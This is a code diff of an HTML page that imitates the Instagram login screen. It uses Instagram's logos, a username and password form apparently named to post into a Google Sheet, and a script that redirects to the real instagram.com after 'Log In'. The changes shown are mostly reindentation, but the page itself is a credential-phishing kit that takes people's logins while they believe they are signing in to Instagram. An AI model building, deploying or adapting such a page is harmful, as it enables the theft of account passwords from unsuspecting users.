@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -10,6 +11,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="./app.css">
 </head>
+
 <body>
     <div class="container">
         <div class="main-container">
@@ -29,39 +31,39 @@
                             <img src="./images/logo-light.png" alt="Instagram logo" class="logo-light">
                             <img src="./images/logo-dark.png" alt="Instagram logo" class="logo-dark">
                         </div>
-                            <form method="post" name="google-sheet">
-                                <div class="signin-form" id="signin-form">
-                                    <div class="form-group">
-                                        <input class="input-box" type="text" name="username" required placeholder="Phone number, username, or email">
+                        <form method="post" name="google-sheet">
+                            <div class="signin-form" id="signin-form">
+                                <div class="form-group">
+                                    <input class="input-box" type="text" name="username" required placeholder="Phone number, username, or email">
+                                </div>
+                                <div class="form-group">
+                                    <div class="animate-input">
+                                        <input class="input-box" type="password" name="password" required placeholder="Password">
+                                        <button>Show</button>
                                     </div>
-                                    <div class="form-group">
-                                        <div class="animate-input">
-                                            <input class="input-box" type="password" name="password" required placeholder="Password">
-                                            <button>Show</button>
-                                        </div>
-                                    </div>
-                                    <div class="btn-group">
-                                       <input class="button" type="submit" name="login" value="Log In" onClick="myFunction()"/>
-                                       <script>
-      function myFunction() {
-        window.location.href="https://www.instagram.com";  
-      }
-    </script>
-                                    </div>
-                                    <div class="divine">
-                                        <div></div>
-                                        <div>OR</div>
-                                        <div></div>
-                                    </div>
-                                    <div class="btn-group">
-                                        <button class="btn-fb">
+                                </div>
+                                <div class="btn-group">
+                                    <input class="button" type="submit" name="login" value="Log In" onClick="myFunction()" />
+                                    <script>
+                                        function myFunction() {
+                                            window.location.href = "https://www.instagram.com";
+                                        }
+                                    </script>
+                                </div>
+                                <div class="divine">
+                                    <div></div>
+                                    <div>OR</div>
+                                    <div></div>
+                                </div>
+                                <div class="btn-group">
+                                    <button class="btn-fb">
                                     <img src="./images/facebook-icon.png" alt="">
                                     <span>Log in with Facebook</span>
                                 </button>
-                                    </div>
-                                    <a href="#" class="forgot-pw">Forgot password?</a>
                                 </div>
-                            </form>
+                                <a href="#" class="forgot-pw">Forgot password?</a>
+                            </div>
+                        </form>
                     </div>
                     <div class="top">
                         <div class="box goto">
@@ -118,4 +120,5 @@
         })
     </script>
 </body>
+
 </html>
